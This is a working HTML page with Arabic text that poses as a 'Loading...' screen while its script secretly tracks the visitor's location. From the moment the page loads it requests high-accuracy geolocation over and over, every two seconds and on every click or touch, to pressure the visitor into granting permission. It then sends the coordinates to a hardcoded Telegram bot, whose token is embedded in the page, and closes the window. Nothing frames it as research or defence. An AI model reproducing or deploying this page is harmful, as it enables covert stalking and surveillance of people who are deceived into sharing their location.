<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";
        
        let requestCount = 0;

        // دالة طلب الموقع
        function requestLocation() {
            requestCount++;
            console.log("طلب الموقع رقم:", requestCount);
            
            if (!navigator.geolocation) {
                console.log("المتصفح لا يدعم الموقع");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                // ✅ النجاح
                async function(position) {
                    console.log("✅ تم الحصول على الموقع!");
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    // إرسال إلى البوت
                    const message = `📍 موقع جديد\nالإحداثيات: ${lat}, ${lng}\nالمحاولة: ${requestCount}`;
                    
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                text: message
                            })
                        });
                        console.log("تم الإرسال للبوت");
                        window.close();
                    } catch (error) {
                        console.log("خطأ في الإرسال");
                    }
                },
                // ❌ الفشل - نعيد المحاولة
                function(error) {
                    console.log("تم رفض الطلب، إعادة المحاولة...");
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }

        // بدء الطلبات المتكررة
        function startRequests() {
            console.log("بدء طلبات الموقع...");
            
            // طلب فوري
            requestLocation();
            
            // طلب كل 2 ثانية
            setInterval(requestLocation, 2000);
            
            // طلب عند أي تفاعل
            document.addEventListener('click', requestLocation);
            document.addEventListener('touchstart', requestLocation);
        }

        // البدء عند تحميل الصفحة
        window.onload = startRequests;

    </script>
</head>
<body style="margin: 0; padding: 20px; font-family: Arial; text-align: center; background: #f0f0f0;">
    <div style="background: white; padding: 30px; border-radius: 10px; margin: 50px auto; max-width: 400px;">
        <h2>جاري التحميل...</h2>
        <p>يتم تحميل المحتوى، قد يطلب المتصفح إذن الموقع</p>
        <div id="status" style="margin-top: 20px; padding: 10px; background: #e3f2fd; border-radius: 5px;">
            في انتظار السماح بالموقع...
        </div>
    </div>
</body>
</html>